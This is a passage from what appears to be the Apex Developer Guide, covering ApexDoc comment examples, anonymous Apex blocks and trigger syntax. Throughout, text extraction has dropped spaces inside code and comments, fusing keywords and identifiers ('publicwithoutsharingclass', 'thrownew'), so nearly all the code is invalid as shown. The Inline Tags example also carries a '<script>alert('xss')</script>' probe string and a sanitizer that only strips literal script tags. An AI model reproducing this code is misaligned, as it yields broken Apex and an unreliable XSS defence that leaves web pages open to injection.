declaration, and any important usage notes. For example, include whether the property is read-only after initialization, or its default
value. Block tags such as @see, @since, and @deprecated can also be applicable.
Here’s an example ApexDoc comment for the public maxRetries variable.
/**
* Storesthe maximumnumberof retryattemptsfor an operation.
* Defaultsto 3 if not explicitlyset.
* @since0.1.1
*/
publicIntegermaxRetries{
get {
returnmaxRetries?? 3;
}
set { maxRetries= value;}
}
Triggers
Apex triggers on page 264 are event-driven pieces of code that execute in response to specific database operations. Apex trigger
definitions provide significant context, so we strongly recommend that you delegate all business logic to a separate handler class or a
trigger framework. Therefore, ApexDoc doesn’t have any trigger-specific comment specifications.
However, you can still include standard ApexDoc tags such as @since and @see. For example, here’s a ApexDoc comment for the
Opportunity trigger.
/**
* @since1.3.2
*/
triggerOpportunityTriggeron Opportunity(
beforeinsert,
afterinsert,
beforeupdate,
afterupdate,
beforedelete,
afterdelete,
afterundelete
) {
new OpportunityTriggerHandler().run();
}
Annotations
Apex annotations on page 92, such as @AuraEnabled and @Future, modify the way a class or method is used by the platform
and other code. For an element that has an annotation, document the implications of that annotation for the element’s behavior or
usage.
Refer to this table as you write ApexDoc comments for elements with Apex annotations.
249
Document Your Apex CodeApex Developer Guide

Table 4: Document Common Apex Annotations
Guidance for the ApexDoc Comment of the Annotated ElementApex Annotation
If the element is exposed to Lightning components for client-side access, document
whether (cacheable=true). Describe the implications of this cache setting.
@AuraEnabled on page 94
If the element is callable from Flow Builder, explain the element’s function as an invocable
action. Mention label and description attributes from the annotation if they
@InvocableMethod on page 95
provide important context. Use @param and @return for the element’s specific input
and output structure.
Clarify the variable’s specific role, data type, and any constraints or expectations for the
action.
@InvocableVariable on page 100
Describe the overall resource. Also document the annotated Apex REST methods
(@HttpDelete, @HttpGet, @HttpPatch,@HttpPost, or @HttpPut) with
their specific roles.
@RestResource(urlMapping=...)
on page 114
Include the @deprecated tag. Explain the reason for the deprecation and specify the
recommended alternative.
@Deprecated on page 94
Describe the implications of running the method asynchronously. For example, you can
specify whether the method runs in a separate transaction, describe governor limit
considerations, and explain callout behavior.
@Future on page 95
Briefly describe the scenario or functionality being tested. Test documentation is often
excluded from public API docs. If seeAllData is true, explain why this setting is
necessary. If onInstall is true, explain why this setting is necessary.
@IsTest on page 105
Explain if the element is used for performance with large query sets or specific APIs.@ReadOnly on page 111
Describe the common test data being created.@TestSetup on page 113
Describe the rationale for the element’s annotation. For example, on private or protected
member methods or variables, document “Visibility modified for testing purposes.”
@TestVisible on page 113
Specify the warning that the third-party tool suppresses and briefly explain the rationale
for the suppression if it’s not self-evident.
@SuppressWarnings on page 113
Clarify if this annotation restricts exposure compared to global access or why this level
of access is appropriate.
@NamespaceAccessible on page 110
SEE ALSO:
ApexDoc Comment Structure and Tags
ApexDoc Examples
ApexDoc Examples
See practical examples of ApexDoc comments applied to various Apex constructs.
250
Document Your Apex CodeApex Developer Guide

Class Example
/**
* Managescustomeraccountinformationand relatedoperations.
* Thisclassbypassesuserrecordaccessvia 'withoutsharing'so thatit
* can be usedin a batchclasses.
* @authorJohnDeveloper
* @since0.1.0
* @version0.3.1
* @seeAccountProcessingBatch
* @groupAccount
* @example
* {@code
* Accounta;
* try {
*  a = new AccountManager().createAccount('Acme','Agriculture');
* } catch(AccountManager.AccountExceptioncaught){
*   LOGGER.log(caught);
*   // furtherexceptionhandling
* }
* }
*/
publicwithoutsharingclassAccountManager{
/**
* The defaultregionfor new accountsif not specified.
*/
publicstaticfinalStringDEFAULT_REGION= 'NorthAmerica';
/**
* Storesthe countof activeaccountsmanagedby thisinstance.
* Populatedafterusingthe {@linkAccountService}.
*/
@TestVisible
privateIntegeractiveAccountCount;
/**
* Createsa new AccountsObjectwiththe givennameand industry.
* @paramaccountNameThe desirednamefor the new account.Cannotbe nullor empty.
* @paramindustryThe industryclassificationfor the new account.
* @returnThe newlycreatedAccountsObjectwithits ID populated.
* @throwsAccountManager.AccountExceptionif accountNameis invalid
* or if DML operationfails.
*/
publicAccountcreateAccount(StringaccountName,Stringindustry){
if (String.isBlank(accountName)){
thrownew AccountManager.AccountException('Accountnamecannotbe blank.');
}
Accountacc = new Account(Name= accountName,Industry= industry);
// Potentiallymorelogichere
try {
insertacc;
} catch(DmlExceptione) {
thrownew AccountManager.AccountException(
'Failedto createaccount:' + e.getMessage()
251
Document Your Apex CodeApex Developer Guide

);
}
returnacc;
}
// moremethods...
/**
* Representsan exceptionspecificto AccountManageroperations.
* @example
* {@code
* thrownew AccountManager.AccountException('Accountnot foundwithprovidedId.');
* }
*/
publicclassAccountExceptionextendsException{}
}
Packaged Class Example
/**
* Providesservicesfor geolocationand addressconversion.
* @authorDennisSmith
* @version0.3.0
* @since0.1.0
*/
globalwithsharingclassGeolocationService{
/**
* Representsgeographiccoordinates(latitudeand longitude).
*/
globalclassCoordinates{
@AuraEnabled
publicDecimallatitude;
@AuraEnabled
publicDecimallongitude;
globalCoordinates(Decimallat,Decimallon){
this.latitude= lat;
this.longitude= lon;
}
}
/**
* Convertsa fulladdressstringto approximatelatitude
* and longitudecoordinates.Thismethodis deprecatedand shouldno
* longerbe useddue to its relianceon an older,lessaccurategeocoding
* serviceand simplerparsinglogic.It may not handleall addressformats
* correctlyand has a lowersuccessrate.
* @paramfullAddressThe completeaddressstring
* (e.g.,"123MainSt, Anytown,CA 90210,USA").
* @returnA `Coordinates`objectrepresentingthe approximatelatitudeand longitude.
* @throwsDeprecatedMethodCalledExceptionIf thismethodis invoked,
* informingthe userto migrateto the newer,morerobust`geocodeAddress`method.
* @deprecatedin 0.2.0.Use {@link#geocodeAddress(
252
Document Your Apex CodeApex Developer Guide

* Stringstreet,
* Stringcity,
* Stringstate,
* StringpostalCode,
* Stringcountry)}instead.
* @since0.1.0
*/
@Deprecated
globalstaticCoordinatesconvertAddressToCoordinates(StringfullAddress){
thrownew DeprecatedMethodCalledException(
'Themethod`GeolocationService.convertAddressToCoordinates(StringfullAddress)`is
deprecated.' +
'Pleaseuse `GeolocationService.geocodeAddress(Stringstreet,Stringcity,String
state,StringpostalCode,Stringcountry)`' +
'forall new and existingaddress-to-coordinateconversionsto ensurebetter
accuracyand reliability.'
);
}
/**
* Geocodesa structuredaddressintopreciselatitudeand longitudecoordinates
* usinga robustexternalgeocodingservice.
* Thismethodprovideshigheraccuracyand betterhandlingof diverseaddressformats.
* @paramstreetThe streetaddress(e.g.,"123MainSt").
* @paramcityThe city(e.g.,"Anytown").
* @paramstateThe stateor provinceabbreviation(e.g.,"CA").
* @parampostalCodeThe postalor ZIP code(e.g.,"90210").
* @paramcountryThe countrynameor code(e.g.,"USA").
* @returnA Coordinatesobjectcontainingthe latitudeand longitude.
* @throwsGeocodingExceptionIf the addresscannotbe geocoded,
* if the externalserviceis unavailable,or if requiredaddress
* componentsare missing.
* @example
* {@code
* try {
*   GeolocationService.Coordinatescoords= GeolocationService.geocodeAddress(
*'415MissionSt',
*'SanFrancisco',
*'CA',
*'94105',
*'USA'
*   );
* } catch(GeolocationService.GeocodingExceptione) {
*   // handlefailure
* }
* }
* @since0.2.0
*/
globalstaticCoordinatesgeocodeAddress(
Stringstreet,
Stringcity,
Stringstate,
StringpostalCode,
253
Document Your Apex CodeApex Developer Guide

Stringcountry
) {
// Implementactualgeocodinglogic
returnnew Coordinates(0,0);
}
/**
* Exceptionthrownwhena deprecatedmethodis called.
* Thisindicatesthatthe callershouldmigrateto the recommendedalternative.
*/
globalclassDeprecatedMethodCalledExceptionextendsException{
}
/**
* Exceptionthrownwhena geocodingoperationfails.
* Thisprovidesspecificcontextfor issuesduringaddress-to-coordinateconversion.
*/
globalclassGeocodingExceptionextendsException{
}
}
Test Class Example
/**
* Specificationsfor the GeolocationService
* @authorJaneDevington
* @version0.2.0
* @seeGeolocationService
* @since0.1.0
*/
@IsTest
privateclassGeolocationServiceTest{
/**
* Verifiesthatknownaddressesare correctlygeocodedto theirexpectedcoordinates.
* @seeGeolocationService#geocodeAddress(
* Stringstreet,
* Stringcity,
* Stringstate,
* StringpostalCode,
* Stringcountry)
*/
@IsTest
privatestaticvoidvalidAddressShouldReturnCorrectCoordinates(){
Stringstreet= '415MissionStreet';
Stringcity= 'SanFrancisco';
Stringstate= 'CA';
StringpostalCode= '94105';
Stringcountry= 'USA';
GeolocationService.Coordinatescoords;
Test.startTest();
coords= GeolocationService.geocodeAddress(
street,
254
Document Your Apex CodeApex Developer Guide

city,
state,
postalCode,
country
);
Test.stopTest();
Assert.isNotNull(
coords,
'Coordinatesshouldnot be nullfor a validaddress.'
);
Assert.areEqual(
37.785834,
coords.latitude,
'Latitudeshouldmatchfor Salesforcetower.'
);
Assert.areEqual(
-122.406417,
coords.longitude,
'Longitudeshouldmatchfor Salesforcetower.'
);
}
/**
* Verifiesthatcallingthe geocodeAddresswithmissingrequiredparameters
* throwsa GeocodingException.
* @seeGeolocationService#geocodeAddress(
* Stringstreet,
* Stringcity,
* Stringstate,
* StringpostalCode,
* Stringcountry)
* @seeGeolocationService#GeocodingException
*/
@IsTest
privatestaticvoidmissingRequiredParametersShouldThrowGeocodingException(){
Stringstreet= ''; // Missing
Stringcity= 'SanFrancisco';
Stringstate= 'CA';
StringpostalCode= 94105;
Stringcountry= 'USA';
Test.startTest();
BooleancaughtException= false;
try {
GeolocationService.geocodeAddress(
street,
city,
state,
postalCode,
country
);
} catch(GeolocationService.GeocodingExceptione) {
caughtException= true;
255
Document Your Apex CodeApex Developer Guide

Assert.areEqual(
'Street,City,and PostalCodeare requiredfor geocoding.',
e.getMessage(),
'Exceptionmessageshouldindicatemissingrequiredfields.'
);
}
Test.stopTest();
Assert.isTrue(
caughtException,
'GeocodingExceptionshouldhavebeenthrownfor missingstreet.'
);
}
/**
* Verifiesthatcallingthe deprecatedmethodthrowsa
* DeprecatedMethodCalledException.
* @seeGeolocationService#convertAddressToCoordinates(Stringaddress)
* @seeGeolocationService#DeprecatedMethodCalledException
*/
@IsTest
privatestaticvoiddeprecatedMethodCallShouldThrowDeprecatedMethodCalledException(){
StringoldAddress= '123DeprecatedLane';
Test.startTest();
BooleancaughtException= false;
try {
GeolocationService.convertAddressToCoordinates(
oldAddress
);
} catch(GeolocationService.DeprecatedMethodCalledExceptione) {
caughtException= true;
Assert.isTrue(
e.getMessage().contains('is deprecated'),
'Exceptionmessageshouldindicatedeprecation.'
);
Assert.isTrue(
e.getMessage().contains('Pleaseuse'),
'Exceptionmessageshouldsuggestnew method.'
);
}
Test.stopTest();
Assert.isTrue(
caughtException,
'DeprecatedMethodCalledExceptionshouldhavebeenthrown.'
);
}
}
256
Document Your Apex CodeApex Developer Guide

Interface Example
/**
* Definesa contractfor objectsthatcan be serializedto a
* specificformat.Implementationsmustprovidelogicfor converting
* theirstateintoa stringrepresentation.
* @authorJaneCoder
* @since0.2.0
*/
publicinterfaceISerializable{
/**
* Serializesthe object'scurrentstateintoa String.
* @returnA Stringrepresentationof the object.
* @throwsSerializationExceptionif the objectcannotbe serialized.
*/
Stringserialize();
/**
* Getsthe formatnamethisserializersupports(e.g.,"JSON","XML").
* @returnThe nameof the serializationformat.
*/
StringgetFormatName();
}
Enum Example
/**
* Representsthe possiblestatuslevelsfor a supportcase.
* Definesstandardvaluesfor caseprogressionin the customerportal.
* @authorJohnDeveloper
* @since0.1.5
*/
publicenumCaseStatus{
/* A newlyopenedcase,not yet assigned.*/
BRAND_NEW,
/* Caseis activelybeingworkedon. */
WORKING,
/* Casehas beenescalatedto a highertier.*/
ESCALATED,
/* Casehas beenresolvedand closed.*/
CLOSED
}
Method Example (with params, return, throws)
/**
* Calculatesthe totalpricefor a listof products,applyinga discount.
* @paramproductCodesA Listof uniqueproductcodesto calculatethe pricefor.
* Eachcodemustcorrespondto an existingProduct2record.
* @paramdiscountPercentageThe discountpercentageto apply(e.g.,10.5for 10.5%).
* Mustbe between0.0 and 100.0.
* @returnThe calculatedtotalpriceas a Decimalafterapplyingthe discount.
* Returns0.0 if productCodesis nullor empty.
257
Document Your Apex CodeApex Developer Guide

* @throwsInvalidArgumentExceptionif discountPercentageis out of range.
* @throwsProductNotFoundExceptionif any productCodedoesnot matchan
* existingproduct.
*/
publicDecimalcalculateTotalPrice(
List<String> productCodes,
DecimaldiscountPercentage
) {
if (discountPercentage< 0.0 || discountPercentage> 100.0){
thrownew IllegalArgumentException(
'Discountpercentagemustbe between0.0 and 100.0.'
);
}
if (productCodes== null|| productCodes.isEmpty()){
return0.0;
}
//...implementationlogicto fetchpricesand calculatetotal...
return100.0;
}
/**
* Representsan exceptionthrownwhena requestedproductcannotbe found.
* Thiscustomexceptionprovidesa clearindicationthata productlookupfailed,
* allowingcallingcodeto handlethe 'notfound'scenariospecifically.
* It is typicallythrownby methodsattemptingto retrieveProduct2records.
* @example
* {@code
* List<Product2>products= [
*   SELECTId
*   FROMProduct2
*   WHEREProductCode= :productCode
*   LIMIT1
* ];
* if (products.isEmpty()){
*   thrownew ProductNotFoundException(
*'Productwithcode' + productCode+ ' not found.'
*  );
* }
* }
*/
publicclassProductNotFoundExceptionextendsException{}
Annotated Method (@AuraEnabled) Example
publicclassOpportunityService{
/**
* Retrievesa listof openopportunitiesfor a givenaccount,
* accessiblefromLightningWeb Components.If the set of openopportunities
* can changeduringinteractionwiththe component,the authorwill
* needto use {@coderefreshApex()}.
* @paramaccountIdThe ID of the Accountto retrieveopportunitiesfor.
* @returnA Listof openOpportunityrecords.Returnsan emptylistif no
* openopportunitiesare foundor if accountIdis invalid.
258
Document Your Apex CodeApex Developer Guide

* @seeOpportunitySelector
*/
@AuraEnabled(cacheable=true)
publicstaticList<Opportunity>getOpenOpportunities(IdaccountId){
List<Opportunity>result= new List<Opportunity>();
//...implementationdetails...
returnresult;
}
}
External Reference Example
/**
* Providesa serviceto retrievecurrentweatherconditionsfroman externalAPI.
* It utilizesSalesforceNamedCredentialsfor secureendpointand
* authenticationmanagement.
* @authorJohnDoe
* @since1.0.3
*/
publicwithsharingclassWeatherService{
/**
* Retrievesthe currentweatherconditionsfor a specifiedcityand country.
* Thismethodmakesan HTTPGET calloutto an externalweatherAPI usinga
* NamedCredential.
* @paramcityThe nameof the city(e.g.,"London").
* @paramcountryThe nameor codeof the country(e.g.,"UK"or "UnitedKingdom").
* @returnA JSONstringrepresentingthe currentweatherconditions.
* @throwsWeatherServiceExceptionIf the HTTPcalloutfails,returnsa non-200status,
* or if there'san issueparsingthe response.
* @see<a href="https://example.com/weather-api-docs/current-conditions.html">External
* WeatherAPI</a>
*/
publicstaticStringgetCurrentWeather(
Stringcity,
Stringcountry
) {
if (String.isBlank(city)|| String.isBlank(country)){
thrownew WeatherServiceException(
'Cityand countrycannotbe blankfor weatherlookup.'
);
}
StringnamedCredentialUrl= 'callout:WeatherAPI/current';
StringrequestParams=
'?city='+
EncodingUtil.urlEncode(city,'UTF-8') +
'&country='+
EncodingUtil.urlEncode(country,'UTF-8');
HttpRequestreq = new HttpRequest();
req.setEndpoint(namedCredentialUrl+ requestParams);
259
Document Your Apex CodeApex Developer Guide

req.setMethod('GET');
req.setTimeout(60000);
Httphttp= new Http();
HttpResponseres;
try {
res = http.send(req);
} catch(System.CalloutExceptione) {
thrownew WeatherServiceException(
'HTTPCalloutFailed:' + e.getMessage()
);
}
if (res.getStatusCode()== 200){
returnres.getBody();
} else{
thrownew WeatherServiceException(
'Failedto retrieveweatherdata.Status:' +
res.getStatusCode()+
'. Details:' +
res.getBody()
);
}
}
/**
* Customexceptionfor errorsduringweatherdataretrieval.
*/
publicclassWeatherServiceExceptionextendsException{
}
}
Inline Tags Example
/**
* Sanitizesa giveninputstringby removingor replacingcertain
* characterssuchas {@code<script>}
* @paraminputStringThe raw stringprovidedby a useror externalsource.
* Thisstringmightcontainmaliciousor unexpectedcharacters,
* likea {@literal<script>}tag or a backslash{@literal\}.
* @returnThe sanitizedstringafterprocessing.
* @example
* {@code
* StringbadInput= 'Hello,<script>alert(\'xss\')</script>World!';
* StringsafeOutput= SecurityUtils.sanitizeInput(badInput);
* System.debug('SanitizedOutput:' + safeOutput);
* } * @see{@linkString#escapeHtml4}for a similarbuilt-inmethod.
* {@hiddenNOTETO MAINTAINERS:Thismethodshouldbe updatedif
* new securitythreatsare identified.The currentregex
* is designedto handlecommonXSS patternsbut may not
* be exhaustive.The lastmajorupdatewas in v2.1.}
* @since2.0
260
Document Your Apex CodeApex Developer Guide

*/
globalstaticStringsanitizeInput(StringinputString){
// simpleexamplefor demonstrationpurposes
Stringsanitized= inputString;
sanitized= sanitized.replace('<script>', '').replace('</script>', '');
sanitized= sanitized.replace('&#40;','(').replace('&#41;',')');
returnsanitized;
}
SEE ALSO:
ApexDoc Comment Structure and Tags
Document Apex Constructs and Features
Running Apex
You can access many features of the Salesforce user interface programmatically in Apex, and you can integrate with external SOAP and
REST Web services. You can run Apex code using a variety of mechanisms. Apex code runs in atomic transactions.
Invoking Apex
You can run Apex code with triggers, or asynchronously, or as SOAP or REST web services.
Apex Transactions and Governor Limits
Apex Transactions ensure the integrity of data. Apex code runs as part of atomic transactions. Governor execution limits ensure the
efficient use of resources on the Lightning Platform multitenant platform.
Using Salesforce Features with Apex
Many features of the Salesforce user interface are exposed in Apex so that you can access them programmatically in the Lightning
Platform. For example, you can write Apex code to post to a Chatter feed, or use the approval methods to submit and approve
process requests.
Integration and Apex Utilities
Apex allows you to integrate with external SOAP and REST Web services using callouts. You can use utilities for JSON, XML, data
security, and encoding. A general-purpose utility for regular expressions with text strings is also provided.
Invoking Apex
You can run Apex code with triggers, or asynchronously, or as SOAP or REST web services.
1.Anonymous Blocks
An anonymous block is Apex code that doesn’t get stored in the metadata, but that can be compiled and executed.
2.Triggers
Apex can be invoked by using triggers. Apex triggers enable you to perform custom actions before or after changes to Salesforce
records, such as insertions, updates, or deletions.
3.Asynchronous Apex
Apex offers multiple ways for running your Apex code asynchronously. Choose the asynchronous Apex feature that best suits your
needs.
261
Running ApexApex Developer Guide

4.Exposing Apex Methods as SOAP Web Services
You can expose your Apex methods as SOAP web services so that external applications can access your code and your application.
5.Exposing Apex Classes as REST Web Services
You can expose your Apex classes and methods so that external applications can access your code and your application through
the REST architecture.
6.Apex Email Service
You can use email services to process the contents, headers, and attachments of inbound email. For example, you can create an
email service that automatically creates contact records based on contact information in messages.
7.Using the InboundEmail Object
For every email the Apex email service domain receives, Salesforce creates a separate InboundEmail object that contains the contents
and attachments of that email. You can use Apex classes that implement the Messaging.InboundEmailHandler interface
to handle an inbound email message. Using the handleInboundEmail method in that class, you can access an InboundEmail
object to retrieve the contents, headers, and attachments of inbound email messages, as well as perform many functions.
8.Visualforce Classes
In addition to giving developers the ability to add business logic to Salesforce system events such as button clicks and related record
updates, Apex can also be used to provide custom logic for Visualforce pages through custom Visualforce controllers and controller
extensions.
9.JavaScript Remoting
Use JavaScript remoting in Visualforce to call methods in Apex controllers from JavaScript. Create pages with complex, dynamic
behavior that isn’t possible with the standard Visualforce AJAX components.
10.Apex in AJAX
The AJAX toolkit includes built-in support for invoking Apex through anonymous blocks or public webservice methods.
Anonymous Blocks
An anonymous block is Apex code that doesn’t get stored in the metadata, but that can be compiled and executed.
User Permissions Needed
“API Enabled” and “Author Apex”To execute anonymous Apex:
(Anonymous Apex execution through the API allows restricted access without the “Author
Apex” permission.)
Customize ApplicationIf an anonymous Apex callout references a named credential as the endpoint:
Compile and execute anonymous blocks using one of the following:
•
Developer Console
•
Salesforce extensions for Visual Studio Code
•
The executeAnonymous() SOAP API call:
ExecuteAnonymousResultexecuteAnonymous(Stringcode)
You can use anonymous blocks to quickly evaluate Apex in the Developer Console or using the Salesforce Extensions for Visual Studio
Code and Code Builder.
262
Invoking ApexApex Developer Guide

Important:  Every time you run an anonymous block, the code and its references are compiled. For repetitive calls, we strongly
recommend you use compiled classes, such as Apex REST endpoints.
Note the following about the content of an anonymous block (for executeAnonymous(), the code String):
•
Can include user-defined methods and exceptions.
•
User-defined methods can’t include the keyword static.
•
You don’t have to manually commit any database changes.
•
If an Apex trigger within an anonymous block completes successfully, the changes are committed to the database only after all
operations in the block finish executing and don’t cause any errors. If your Apex trigger doesn’t complete successfully, any changes
made to the database in the anonymous block are rolled back.
•
Unlike classes and triggers, anonymous blocks execute as the current user and can fail to compile if the code violates the user's
object- and field-level permissions.
•
Don’t have a scope other than local. For example, although it’s legal to use the global access modifier, it has no meaning. The
scope of the method is limited to the anonymous block.
•
When you define a class or interface (a custom type) in an anonymous block, it’s considered virtual by default when the anonymous
block executes. This fact is true even if your custom type wasn’t defined with the virtual modifier. To avoid this from happening,
save your class or interface in Salesforce. (Classes and interfaces defined in an anonymous block aren’t saved in your org.)
Even though a user-defined method can refer to itself or later methods without the need for forward declarations, variables can’t be
referenced before their actual declaration. In the following example, the Integer int must be declared while myProcedure1
doesn’t:
Integerint1= 0;
voidmyProcedure1(){
myProcedure2();
}
voidmyProcedure2(){
int1++;
}
myProcedure1();
The returned result for anonymous blocks includes:
•
Status information for the compile and execute phases of the call, including any errors that occur
•
The debug log content, including the output of any calls to the System.debug method (see Debug Log on page 666)
•
The Apex stack trace of any uncaught code execution exceptions, including the class, method, and line number for each call stack
element
For more information, see executeAnonymous(), Working with Logs in the Developer Console, and Salesforce extensions for Visual
Studio Code and Code Builder.
Executing Anonymous Apex through the API and the Author Apex Permission
To run any Apex code with the executeAnonymous() API call, including Apex methods saved in the org, users must have the
Author Apex permission. For users who don’t have the Author Apex permission, the API allows restricted execution of anonymous Apex.
This exception applies only when users execute anonymous Apex through the API, or through a tool that uses the API, but not in the
Developer Console. Such users are allowed to run the following in an anonymous block.
•
Code that they write in the anonymous block
263
Invoking ApexApex Developer Guide

•
Web service methods (methods declared with the webservice keyword) that are saved in the org
•
Any built-in Apex methods that are part of the Apex language
Running any other Apex code isn’t allowed when the user doesn’t have the Author Apex permission. For example, calling methods of
custom Apex classes that are saved in the org isn’t allowed nor is using custom classes as arguments to built-in methods.
When users without the Author Apex permission run DML statements in an anonymous block, triggers can get fired as a result.
SEE ALSO:
Named Credentials as Callout Endpoints
Triggers
Apex can be invoked by using triggers. Apex triggers enable you to perform custom actions before or after changes to Salesforce records,
such as insertions, updates, or deletions.
A trigger is Apex code that executes:
•
Before or after an insert operation
•
Before or after an update operation
•
Before or after a delete operation
•
Before or after a merge operation
•
Before or after an upsert operation
•
After an undelete operation
An Apex trigger can also execute after the undelete operation.
For example, you can have a trigger run before an object's records are inserted into the database, after records have been deleted, or
even after a record is restored from the Recycle Bin.
You can define triggers for top-level standard objects that support triggers, such as a Contact or an Account, some standard child objects,
such as a CaseComment, and custom objects. To define a trigger, from the object management settings for the object whose triggers
you want to access, go to Triggers.
There are two types of triggers.
•
Before triggers are used to update or validate record values before they’re saved to the database.
•
After triggers are used to access field values that are set by the system (such as a record's Id or LastModifiedDate field), and
to affect changes in other records, such as logging into an audit table or firing asynchronous events with a queue. The records that
fire the after trigger are read-only.
Triggers can also modify other records of the same type as the records that initially fired the trigger. For example, if a trigger fires after
an update of contact A, the trigger can also modify contacts B, C, and D. Because triggers can cause other records to change, and
because these changes can, in turn, fire more triggers, the Apex runtime engine considers all such operations a single unit of work and
sets limits on the number of operations that can be performed to prevent infinite recursion. See Execution Governors and Limits on page
346.
Additionally, if you update or delete a record in its before trigger, or delete a record in its after trigger, you will receive a runtime error.
This includes both direct and indirect operations. For example, if you update account A, and the before update trigger of account A
inserts contact B, and the after insert trigger of contact B queries for account A and updates it using the DML update statement or
database method, then you are indirectly updating account A in its before trigger, and you will receive a runtime error.
264
Invoking ApexApex Developer Guide

Implementation Considerations
Before creating triggers, consider the following:
•
upsert triggers fire both before and after insert or before and after update triggers as appropriate.
•
merge triggers fire both before and after delete for the losing records, and both before and after update triggers for the
winning record. See Triggers and Merge Statements on page 273.
•
Triggers that execute after a record has been undeleted only work with specific objects. See Triggers and Recovered Records on
page 273.
•
Field history is not recorded until the end of a trigger. If you query field history in a trigger, you don’t see any history for the current
transaction.
•
Field history tracking honors the permissions of the current user. If the current user doesn’t have permission to directly edit an object
or field, but the user activates a trigger that changes an object or field with history tracking enabled, no history of the change is
recorded.
•
Callouts must be made asynchronously from a trigger so that the trigger process isn’t blocked while waiting for the external service's
response. The asynchronous callout is made in a background process, and the response is received when the external service returns
it. To make an asynchronous callout, use asynchronous Apex such as a future method. See Invoking Callouts Using Apex for more
information.
•
In API version 20.0 and earlier, if a Bulk API request causes a trigger to fire, each chunk of 200 records for the trigger to process is split
into chunks of 100 records. In Salesforce API version 21.0 and later, no further splits of API chunks occur. If a Bulk API request causes
a trigger to fire multiple times for chunks of 200 records, governor limits are reset between these trigger invocations for the same
HTTP request.
1.Bulk Triggers
2.Trigger Syntax
3.Trigger Context Variables
4.Context Variable Considerations
5.Common Bulk Trigger Idioms
6.Defining Triggers
Trigger code is stored as metadata under the object with which they are associated.
7.Triggers and Merge Statements
8.Triggers and Recovered Records
9.Triggers and Order of Execution
When you save a record with an insert, update, or upsert statement, Salesforce performs a sequence of events in a certain
order.
10.Operations That Don't Invoke Triggers
Some operations don’t invoke triggers.
11.Entity and Field Considerations in Triggers
When you create triggers, consider the behavior of certain entities, fields, and operations.
12.Triggers for Chatter Objects
You can write triggers for the FeedItem and FeedComment objects.
13.Trigger Considerations for Knowledge Articles
You can write triggers for KnowledgeArticleVersion objects. Learn when you can use triggers, and which actions don’t fire triggers,
like archiving articles.
265
Invoking ApexApex Developer Guide

14.Trigger Exceptions
15.Trigger and Bulk Request Best Practices
Bulk Triggers
All triggers are bulk triggers by default, and can process multiple records at a time. You should always plan on processing more than one
record at a time.
Note:  An Event object that is defined as recurring is not processed in bulk for insert, delete, or update triggers.
Bulk triggers can handle both single record updates and bulk operations like:
•
Data import
•
Lightning Platform Bulk API calls
•
Mass actions, such as record owner changes and deletes
•
Recursive Apex methods and triggers that invoke bulk DML statements
Trigger Syntax
To define a trigger, use the following syntax:
triggerTriggerNameonObjectName(trigger_events) {
code_block
}
where trigger_events can be a comma-separated list of one or more of the following events:
For example, the following code defines a trigger for the beforeinsert and beforeupdate events on the Account object:
triggermyAccountTriggeron Account(beforeinsert, beforeupdate) {
// Yourcodehere
}
The code block of a trigger cannot contain the static keyword. Triggers can only contain keywords applicable to an inner class. In
addition, you do not have to manually commit any database changes made by a trigger. If your Apex trigger completes successfully,
any database changes are automatically committed. If your Apex trigger does not complete successfully, any changes made to the
database are rolled back.
Trigger Context Variables
All triggers define implicit variables that allow developers to access run-time context. These variables are contained in the
System.Trigger class.
UsageVariable
Returns true if the current context for the Apex code is a trigger, not a Visualforce page, a Web service,
or an executeanonymous() API call.
isExecuting
Returns true if this trigger was fired due to an insert operation, from the Salesforce user interface,
Apex, or the API.
isInsert
Returns true if this trigger was fired due to an update operation, from the Salesforce user interface,
Apex, or the API.
isUpdate
266
Invoking ApexApex Developer Guide

UsageVariable
Returns true if this trigger was fired due to a delete operation, from the Salesforce user interface,
Apex, or the API.
isDelete
Returns true if this trigger was fired before any record was saved.isBefore
Returns true if this trigger was fired after all records were saved.isAfter
Returns true if this trigger was fired after a record is recovered from the Recycle Bin. This recovery
can occur after an undelete operation from the Salesforce user interface, Apex, or the API.
isUndelete
Returns a list of the new versions of the sObject records.
This sObject list is only available in insert, update, and undelete triggers, and the records
can only be modified in before triggers.
new
A map of IDs to the new versions of the sObject records.
This map is only available in beforeupdate, afterinsert, afterupdate, and
afterundelete triggers.
newMap
Returns a list of the old versions of the sObject records.
This sObject list is only available in update and delete triggers.
old
A map of IDs to the old versions of the sObject records.
This map is only available in update and delete triggers.
oldMap
Returns an enum of type System.TriggerOperation corresponding to the current operation.
Possible values of the System.TriggerOperation enum are: BEFORE_INSERT, BEFORE_UPDATE,
BEFORE_DELETE,AFTER_INSERT, AFTER_UPDATE, AFTER_DELETE, and
operationType
AFTER_UNDELETE. If you vary your programming logic based on different trigger types, consider
using the switch statement with different permutations of unique trigger execution enum states.
The number of records processed in a trigger invocation. DML operations that include over 200
records are processed in batches, and the trigger is invoked for each batch. Trigger.size
size
includes only the number of records in the current batch, not the total number of records in the DML
operation.
Note:  The record firing a trigger can include an invalid field value, such as a formula that divides by zero. In this case, the field
value is set to null in these variables:
•
new
•
newMap
•
old
•
oldMap
267
Invoking ApexApex Developer Guide

For example, in this simple trigger, Trigger.new is a list of sObjects and can be iterated over in a for loop. It can also be used as
a bind variable in the IN clause of a SOQL query.
TriggersimpleTriggeron Account(afterinsert) {
for (Accounta : Trigger.new) {
// IterateovereachsObject
}
// Thissinglequeryfindseverycontactthatis associatedwithany of the
// triggeringaccounts.NotethatalthoughTrigger.newis a collectionof
// records,whenusedas a bindvariablein a SOQLquery,Apexautomatically
// transformsthe listof recordsintoa listof correspondingIds.
Contact[]cons= [SELECTLastNameFROMContact
WHEREAccountIdIN :Trigger.new];
}
This trigger uses Boolean context variables like Trigger.isBefore and Trigger.isDelete to define code that only executes
for specific trigger conditions:
triggermyAccountTriggeron Account(beforedelete, beforeinsert, beforeupdate,
afterdelete, afterinsert, afterupdate) {
if (Trigger.isBefore){
if (Trigger.isDelete){
// In a beforedeletetrigger,the triggeraccessesthe recordsthatwillbe
// deletedwiththe Trigger.oldlist.
for (Accounta : Trigger.old){
if (a.name!= 'okToDelete') {
a.addError('Youcan\'tdeletethisrecord!');
}
}
} else{
// In beforeinsertor beforeupdatetriggers,the triggeraccessesthe new records
// withthe Trigger.newlist.
for (Accounta : Trigger.new) {
if (a.name== 'bad') {
a.name.addError('Badname');
}
}
if (Trigger.isInsert){
for (Accounta : Trigger.new) {
System.assertEquals('xxx', a.accountNumber);
System.assertEquals('industry', a.industry);
System.assertEquals(100,a.numberofemployees);
System.assertEquals(100.0,a.annualrevenue);
a.accountNumber= 'yyy';
}
// If the triggeris not a beforetrigger,it mustbe an aftertrigger.
} else{
if (Trigger.isInsert){
